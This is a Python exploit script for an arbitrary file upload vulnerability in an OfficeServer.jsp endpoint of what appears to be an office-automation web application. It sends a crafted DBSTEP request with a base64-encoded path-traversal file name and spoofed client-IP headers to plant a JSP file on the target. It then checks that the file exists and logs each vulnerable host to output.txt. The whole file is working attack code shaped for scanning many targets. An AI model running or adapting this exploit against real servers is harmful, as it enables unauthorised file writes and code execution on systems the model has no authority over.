import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()
from colorama import init,Fore
init(autoreset=True)

def poc(url):
    try:
        target = urljoin(url,"/defaultroot/public/iWebOfficeSign/OfficeServer.jsp")
        target1 = urljoin(url,"/defaultroot/public/edit/cmd_test.jsp")
        header = {
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Cache-Control": "max-age=0",
            "ccept-Encoding": "gzip, deflate",
            "Connection": "close",
        }
        burp0_cookies = {"OASESSIONID": "847AE3A2E5D155AE7FB1CD2C6736CD66"}
        burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6", "x-forwarded-for": "127.0.0.1", "x-originating-ip": "127.0.0.1", "x-remote-ip": "127.0.0.1", "x-remote-addr": "127.0.0.1", "Connection": "close"}
        burp0_data = {"DBSTEP V3.0     170              0                1000              DBSTEP": "REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nRECORDID=\r\nisDoc=dHJ1ZQ==\r\nmoduleType=Z292ZG9jdW1lbnQ=\r\nFILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw\r\n111111111111111111111111111111111111111111111111\r\n<% out.println(\"str.RandStr(10)\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n"}
        res = requests.post(url=target, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False,timeout=5)
        res1 = requests.get(url=target1,headers=header,verify=False,timeout=5)
        if res.status_code == 200 and res1.status_code == 200:
            print(Fore.GREEN + url +'[+]存在OfficeServer.jsp 任意文件上传漏洞')
            with open(r'output.txt', 'a+') as w:
                w.write(url+"存在OfficeServer.jsp 任意文件上传漏洞,上传成功路径为:"+ '\n' + url + "/defaultroot/public/edit/cmd_test.jsp"'\n')
            print("[" + "-" * 80 + "]")
        else:
            print(Fore.RED + url +'[-]不存在漏洞')
            print("[" + "-" * 80 + "]")
    except Exception as err:
        print(err)

